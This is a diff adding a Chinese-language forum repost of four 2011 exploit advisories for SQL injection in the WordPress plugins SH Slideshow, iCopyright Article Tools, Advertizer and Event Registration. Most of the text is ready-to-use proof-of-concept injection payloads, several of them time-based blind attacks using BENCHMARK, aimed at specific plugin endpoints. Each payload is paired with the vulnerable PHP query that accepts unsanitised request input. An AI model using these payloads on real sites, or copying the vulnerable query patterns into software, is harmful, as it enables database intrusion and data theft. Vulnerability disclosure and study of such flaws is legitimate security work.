@@ -1,0 +1,68 @@
+WordPress多插件爆出高危漏洞
+1.WordPress SH Slideshow plugin <= 3.1.4 SQL Injection Vulnerability
+# Exploit Title: WordPress SH Slideshow plugin <= 3.1.4 SQL Injection Vulnerability  
+# Date: 2011-08-29  
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)  
+# Software Link: http://downloads.wordpress.org/plugin/sh-slideshow.3.1.4.zip  
+# Version: 3.1.4 (tested)  
+---------------  
+PoC (POST data)  
+---------------  
+http://www.sh3llc0de.com/wp-content/plugins/sh-slideshow/ajax.php  
+id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20  
+---------------  
+Vulnerable code  
+---------------  
+$result = $wpdb->query(''delete from sh_slides where id = ''.$_POST[''id'']); 
+2.WordPress iCopyright(R) Article Tools plugin <= 1.1.4 SQL Injection
+# Exploit Title: WordPress iCopyright(R) Article Tools plugin <= 1.1.4 SQL Injection Vulnerability  
+# Date: 2011-08-29  
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)  
+# Software Link: http://downloads.wordpress.org/plugin/copyright-licensing-tools.zip  
+# Version: 1.1.4 (tested)  
+# Note: magic_quotes has to be turned off  
+---  
+PoC  
+---  
+http://www.sh3llc0de.com/wp-content/plugins/copyright-licensing-tools/icopyright_xml.php?id=1'' AND 1=1--%20  
+---------------  
+Vulnerable code  
+---------------  
+$icopyright_post_id = $_GET[''id'']; //requested post id  
+...  
+$response = $wpdb->get_results("SELECT * FROM $posttable JOIN $usertable on $posttable.post_author=$usertable.ID WHERE $posttable.ID = ''$icopyright_post_id''"); 
+3.WordPress Advertizer plugin <= 1.0 SQL Injection Vulnerability
+# Exploit Title: WordPress Advertizer plugin <= 1.0 SQL Injection Vulnerability  
+# Date: 2011-08-29  
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)  
+# Software Link: http://downloads.wordpress.org/plugin/advertizer.1.0.zip  
+# Version: 1.0 (tested)  
+# Note: magic_quotes has to be turned off  
+---------------  
+PoC (POST data)  
+---------------  
+http://www.sh3llc0de.com/wp-content/plugins/advertizer/click_ads.php  
+id=-1'' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20  
+---------------  
+Vulnerable code  
+---------------  
+$res = $wpdb->get_row("SELECT `limit_clicks`, `trace_clicks` FROM `".$wpdb->prefix."adv_v_base` WHERE `id` = ''".$_POST[id]."'' limit 1;"); 
+4.WordPress Event Registration plugin <= 5.4.3 SQL Injection
+# Exploit Title: WordPress Event Registration plugin <= 5.4.3 SQL Injection Vulnerability  
+# Date: 2011-08-30  
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)  
+# Software Link: http://downloads.wordpress.org/plugin/event-registration.5.43.zip  
+# Version: 5.4.3 (tested)  
+# Note: magic_quotes has to be turned off  
+---  
+PoC  
+---  
+http://www.sh3llc0de.com/wp-content/plugins/event-registration/event_registration_export.php?id=-1'' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20  
+---------------  
+Vulnerable code  
+---------------  
+$id= $_REQUEST[''id''];  
+...  
+$sql  = "SELECT * FROM " . $events_detail_tbl . " WHERE id=''$id''";  
+$result = mysql_query($sql);
+文章转载自『SHELLCODE技术联盟』地址: http://www.sh3llc0de.com/forum-viewthread-tid-262-fromuid-22.html 
